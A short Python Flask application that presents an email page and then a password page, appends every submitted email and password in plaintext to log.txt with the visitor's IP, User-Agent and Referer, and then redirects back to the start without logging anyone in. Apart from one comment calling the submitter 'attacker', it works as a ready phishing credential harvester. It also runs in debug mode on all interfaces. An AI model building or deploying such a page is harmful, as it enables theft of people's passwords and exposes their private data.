from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

def log_data(email, password, ip_address, user_agent, referrer):
    """Log detailed information to log.txt."""
    with open("log.txt", "a") as log_file:
        log_file.write(
            f"Email: {email}, Password: {password}, "
            f"IP Address: {ip_address}, User-Agent: {user_agent}, Referrer: {referrer}\n"
        )

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Handle form submission, process data if necessary
        email = request.form.get('email')
        # Store email in query parameters for passing to the password page
        return redirect(url_for('password', email=email))

    return render_template('index.html')

@app.route('/password', methods=['GET', 'POST'])
def password():
    email = request.args.get('email', 'Unknown')  # Retrieve email from query parameters
    if request.method == 'POST':
        # Capture password input
        password = request.form.get('password')
        # Get attacker's IP address
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        # Get additional headers for logging
        user_agent = request.headers.get('User-Agent', 'Unknown')
        referrer = request.headers.get('Referer', 'Unknown')

        # Log the detailed data
        log_data(email, password, ip_address, user_agent, referrer)

        # Redirect back to the login page or any other page
        return redirect(url_for('index'))

    return render_template('password.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True)
